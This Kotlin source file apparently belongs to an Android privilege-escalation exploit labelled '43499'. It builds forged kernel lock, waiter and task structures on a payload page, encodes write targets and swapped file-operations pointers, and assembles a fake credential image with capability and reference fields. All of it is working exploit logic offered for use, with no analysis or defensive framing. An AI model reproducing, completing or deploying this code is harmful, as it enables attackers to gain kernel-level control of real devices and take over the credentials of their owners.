package com.ghostlock.app.engine.ktstep

/** 43499 的页/凭据/写编码：纯 Kotlin 逻辑，不调用 C++。 */
enum class WriteMode { Disabled, Zero, Credential }

data class WriteRequest(
    val target: Long,
    val mode: WriteMode,
    val preserveChild: Boolean,
    val value: Long = 0L,
)

data class LayoutInputs(
    val pageValue: Long,
    val credentialValue: Long,
    val defaultFops: Long,
    val credentialFops: Long,
    val pointerBytes: Int,
)

data class WriteLayout(
    val parent: Long,
    val value: Long,
    val fops: Long,
    val needsCredentialCopy: Boolean,
)

enum class LayoutVerdict {
    Ok,
    NoRoom,
    WidthInvalid,
    SlotsInvalid,
    LayoutInvalid,
    TooManyReferences,
    FragmentTooSmall,
}

data class WaiterFieldOffsets(val pc: Int, val right: Int, val left: Int)

data class WriteArm(val pc: Long, val right: Long, val left: Long)

data class PayloadSlots(
    val lock: Int,
    val waiter: Int,
    val fakeTask: Int,
    val credCopy: Int,
    val fopsTable: Int,
)

data class LockFields(
    val owner: Int,
    val waitLock: Int,
    val waitList: Int,
    val listLink: Int,
)

data class WaiterFields(
    val headWord: Int,
    val headNext: Int,
    val headPrev: Int,
    val pc: Int,
    val right: Int,
    val left: Int,
    val task: Int,
    val lock: Int,
    val wakeState: Int,
    val prio: Int,
    val deadline: Int,
    val wwCtx: Int,
)

data class TaskFields(
    val usage: Int,
    val prio: Int,
    val normalPrio: Int,
    val piLock: Int,
    val piWaiters: Int,
    val piTopTask: Int,
    val piBlockedOn: Int,
    val group: Int,
)

data class PayloadValues(val taskUsage: Int, val taskPrio: Int, val waiterPrio: Int)

data class PayloadPageInputs(
    val slots: PayloadSlots,
    val lock: LockFields,
    val waiter: WaiterFields,
    val task: TaskFields,
    val values: PayloadValues,
    val waiterWord: Long,
    val waiterTask: Long,
    val fakeTask: Long,
    val fakeLock: Long,
    val taskGroup: Long,
    val piTopTask: Long,
    val pointerBytes: Int,
)

data class CredentialLayout(
    val copySize: Int,
    val usageOffset: Int,
    val usageValue: Int,
    val capsOffset: Int,
    val capsCount: Int,
    val capsValue: Long,
    val refOffsets: IntArray,
    val refImages: LongArray,
    val refCount: Int,
) {
    init {
        require(refOffsets.size == REF_SLOTS) { "refOffsets must have $REF_SLOTS slots" }
        require(refImages.size == REF_SLOTS) { "refImages must have $REF_SLOTS slots" }
    }

    companion object {
        const val REF_SLOTS = 4
    }
}

/** Resolve value/parent/fops for one write; pure and profile-driven. */
fun writeLayout(request: WriteRequest, inputs: LayoutInputs): WriteLayout {
    var layout = WriteLayout(parent = 0L, value = 0L, fops = inputs.defaultFops, needsCredentialCopy = false)
    if (request.mode == WriteMode.Disabled || request.target == 0L) return layout
    if (request.preserveChild) {
        layout = layout.copy(
            value = if (request.mode == WriteMode.Credential) inputs.credentialValue else inputs.pageValue,
        )
    }
    if (request.mode == WriteMode.Credential) {
        layout = layout.copy(fops = inputs.credentialFops, needsCredentialCopy = true)
    }
    val backstep = inputs.pointerBytes.toLong()
    return layout.copy(
        parent = if (request.target.toULong() >= backstep.toULong()) request.target - backstep else 0L,
    )
}

fun layoutMatchesRequest(request: WriteRequest, layout: WriteLayout): Boolean {
    if (request.mode == WriteMode.Disabled) return false
    return if (request.preserveChild) layout.value != 0L else layout.value == 0L
}

fun layoutAcceptsPage(request: WriteRequest, layout: WriteLayout): Boolean {
    if (!layoutMatchesRequest(request, layout)) return false
    if (request.mode == WriteMode.Zero && request.preserveChild && ((layout.value shr 16) and 1L) == 0L) {
        return false
    }
    return true
}

fun armFor(request: WriteRequest, value: Long, pointerBytes: Int): WriteArm {
    if (pointerBytes == 0) return WriteArm(0L, 0L, 0L)
    val backstep = pointerBytes.toLong()
    val pc = if (request.target.toULong() >= backstep.toULong()) request.target - backstep else 0L
    return if (request.preserveChild) WriteArm(pc, value, 0L) else WriteArm(pc, 0L, 0L)
}

/** Encode the arm inside [page] at [fragmentOffset]; nothing is written on refusal. */
fun encodeWaiterArm(
    page: ByteArray,
    fragmentOffset: Int,
    capacity: Int,
    offsets: WaiterFieldOffsets,
    arm: WriteArm,
    pointerBytes: Int,
): LayoutVerdict {
    if (page.isEmpty() || capacity == 0) return LayoutVerdict.FragmentTooSmall
    if (pointerBytes !in 1..8) return LayoutVerdict.WidthInvalid
    val base = fragmentOffset.toLong()
    val cap = capacity.toLong()
    val width = pointerBytes.toLong()
    fun fits(at: Int): Boolean = base + at.toLong() <= cap && width <= cap - (base + at.toLong())
    if (!fits(offsets.pc) || !fits(offsets.right) || !fits(offsets.left)) {
        return LayoutVerdict.FragmentTooSmall
    }
    putPointer(page, fragmentOffset + offsets.pc, arm.pc, pointerBytes)
    putPointer(page, fragmentOffset + offsets.right, arm.right, pointerBytes)
    putPointer(page, fragmentOffset + offsets.left, arm.left, pointerBytes)
    return LayoutVerdict.Ok
}

/** Build the payload page; all checks precede the first store. */
fun buildPayloadPage(
    page: ByteArray,
    inputs: PayloadPageInputs,
    request: WriteRequest,
    layout: WriteLayout,
): LayoutVerdict {
    val capacity = page.size
    if (page.isEmpty()) return LayoutVerdict.NoRoom
    val pointer = inputs.pointerBytes
    if (pointer !in 1..8) return LayoutVerdict.WidthInvalid
    val slots = inputs.slots
    if (slots.lock == 0 || slots.waiter == 0 || slots.fakeTask == 0) return LayoutVerdict.SlotsInvalid
    if (!fits(capacity, slots.lock, pointer) || !fits(capacity, slots.waiter, pointer) ||
        !fits(capacity, slots.fakeTask, pointer)
    ) {
        return LayoutVerdict.NoRoom
    }
    val lock = inputs.lock
    val waiter = inputs.waiter
    val task = inputs.task
    val lockFits = fits(capacity, slots.lock + lock.owner, 4) &&
        fits(capacity, slots.lock + lock.waitLock, 8) &&
        fits(capacity, slots.lock + lock.waitList, 8) &&
        fits(capacity, slots.lock + lock.listLink, pointer)
    val waiterFits = fits(capacity, slots.waiter + waiter.headWord, 8) &&
        fits(capacity, slots.waiter + waiter.headNext, 8) &&
        fits(capacity, slots.waiter + waiter.headPrev, 8) &&
        fits(capacity, slots.waiter + waiter.pc, pointer) &&
        fits(capacity, slots.waiter + waiter.right, pointer) &&
        fits(capacity, slots.waiter + waiter.left, pointer) &&
        fits(capacity, slots.waiter + waiter.task, pointer) &&
        fits(capacity, slots.waiter + waiter.lock, pointer) &&
        fits(capacity, slots.waiter + waiter.wakeState, 4) &&
        fits(capacity, slots.waiter + waiter.prio, 4) &&
        fits(capacity, slots.waiter + waiter.deadline, 8) &&
        fits(capacity, slots.waiter + waiter.wwCtx, pointer)
    val taskFits = fits(capacity, slots.fakeTask + task.usage, 4) &&
        fits(capacity, slots.fakeTask + task.prio, 4) &&
        fits(capacity, slots.fakeTask + task.normalPrio, 4) &&
        fits(capacity, slots.fakeTask + task.piLock, 4) &&
        fits(capacity, slots.fakeTask + task.piWaiters, 16) &&
        fits(capacity, slots.fakeTask + task.group, pointer) &&
        fits(capacity, slots.fakeTask + task.piTopTask, pointer) &&
        fits(capacity, slots.fakeTask + task.piBlockedOn, pointer)
    if (!lockFits || !waiterFits || !taskFits) return LayoutVerdict.NoRoom

    put32(page, slots.lock + lock.owner, 0L)
    put64(page, slots.lock + lock.waitLock, inputs.waiterWord)
    put64(page, slots.lock + lock.waitList, inputs.waiterWord)
    putPointer(page, slots.lock + lock.listLink, inputs.fakeTask or 1L, pointer)

    put64(page, slots.waiter + waiter.headWord, 1L)
    put64(page, slots.waiter + waiter.headNext, 0L)
    put64(page, slots.waiter + waiter.headPrev, 0L)
    val tuple = WaiterFieldOffsets(waiter.pc, waiter.right, waiter.left)
    val arm = armFor(request, layout.value, pointer)
    if (encodeWaiterArm(page, slots.waiter, capacity, tuple, arm, pointer) != LayoutVerdict.Ok) {
        return LayoutVerdict.NoRoom
    }
    val nodeOwner = layout.parent
    putPointer(page, slots.waiter + waiter.right, nodeOwner, pointer)
    putPointer(page, slots.waiter + waiter.right + 8, 0L, pointer)
    putPointer(page, slots.waiter + waiter.right + 16, 0L, pointer)
    putPointer(page, slots.waiter + waiter.left, nodeOwner, pointer)
    putPointer(page, slots.waiter + waiter.left + 8, 0L, pointer)
    putPointer(page, slots.waiter + waiter.left + 16, 0L, pointer)
    putPointer(page, slots.waiter + waiter.task, if (inputs.waiterTask != 0L) inputs.waiterTask else inputs.fakeTask, pointer)
    putPointer(page, slots.waiter + waiter.lock, inputs.fakeLock, pointer)
    put32(page, slots.waiter + waiter.wakeState, 0L)
    put32(page, slots.waiter + waiter.prio, inputs.values.waiterPrio.toLong())
    put64(page, slots.waiter + waiter.deadline, 0L)
    putPointer(page, slots.waiter + waiter.wwCtx, 0L, pointer)

    put32(page, slots.fakeTask + task.usage, inputs.values.taskUsage.toLong())
    put32(page, slots.fakeTask + task.prio, inputs.values.taskPrio.toLong())
    put32(page, slots.fakeTask + task.normalPrio, inputs.values.taskPrio.toLong())
    put32(page, slots.fakeTask + task.piLock, 0L)
    put64(page, slots.fakeTask + task.piWaiters, 0L)
    put64(page, slots.fakeTask + task.piWaiters + 8, 0L)
    putPointer(page, slots.fakeTask + task.group, inputs.taskGroup, pointer)
    putPointer(page, slots.fakeTask + task.piTopTask, inputs.piTopTask, pointer)
    putPointer(page, slots.fakeTask + task.piBlockedOn, 0L, pointer)
    return LayoutVerdict.Ok
}

/** Build a credential copy; all checks precede the first store. */
fun buildCredentialImage(buffer: ByteArray, layout: CredentialLayout, offset: Int): LayoutVerdict {
    val capacity = buffer.size
    if (buffer.isEmpty() || layout.copySize == 0) return LayoutVerdict.LayoutInvalid
    if (!fits(capacity, offset, layout.copySize)) return LayoutVerdict.NoRoom
    if (layout.refCount !in 0..CredentialLayout.REF_SLOTS) return LayoutVerdict.TooManyReferences
    if (!fits(layout.copySize, layout.usageOffset, 4) ||
        !fits(layout.copySize, layout.capsOffset, 8) ||
        layout.capsCount.toLong() * 8L > (layout.copySize - layout.capsOffset).toLong()
    ) {
        return LayoutVerdict.LayoutInvalid
    }
    for (index in 0 until layout.refCount) {
        if (!fits(layout.copySize, layout.refOffsets[index], 8)) return LayoutVerdict.LayoutInvalid
    }
    for (index in 0 until layout.copySize) buffer[offset + index] = 0
    put32(buffer, offset + layout.usageOffset, layout.usageValue.toLong())
    for (index in 0 until layout.capsCount) {
        put64(buffer, offset + layout.capsOffset + index * 8, layout.capsValue)
    }
    for (index in 0 until layout.refCount) {
        put64(buffer, offset + layout.refOffsets[index], layout.refImages[index])
    }
    return LayoutVerdict.Ok
}

private fun fits(capacity: Int, at: Int, width: Int): Boolean =
    at >= 0 && width >= 0 && at <= capacity && width <= capacity - at

private fun put32(buffer: ByteArray, at: Int, value: Long) {
    for (index in 0 until 4) buffer[at + index] = ((value ushr (8 * index)) and 0xFF).toByte()
}

private fun put64(buffer: ByteArray, at: Int, value: Long) {
    for (index in 0 until 8) buffer[at + index] = ((value ushr (8 * index)) and 0xFF).toByte()
}

private fun putPointer(buffer: ByteArray, at: Int, value: Long, width: Int) {
    for (index in 0 until width) buffer[at + index] = ((value ushr (8 * index)) and 0xFF).toByte()
}
